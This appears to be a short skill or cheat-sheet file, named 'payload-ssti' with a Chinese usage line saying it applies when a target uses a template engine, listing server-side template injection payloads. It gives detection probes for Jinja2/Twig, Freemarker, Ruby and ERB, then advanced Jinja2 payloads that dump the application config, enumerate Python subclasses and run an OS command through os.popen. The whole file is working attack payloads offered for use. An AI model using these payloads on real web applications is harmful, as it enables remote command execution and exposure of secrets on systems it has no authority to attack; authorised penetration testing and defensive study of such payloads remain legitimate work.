---
name: payload-ssti
when_to_use: 目标使用模板引擎
---
# SSTI
## Basic
{{7*7}}   (Jinja2/Twig)
${7*7}    (Freemarker)
#{7*7}    (Ruby)
<%=7*7%>  (ERB)
## Advanced
{{config}}
{{''.__class__.__mro__[2].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
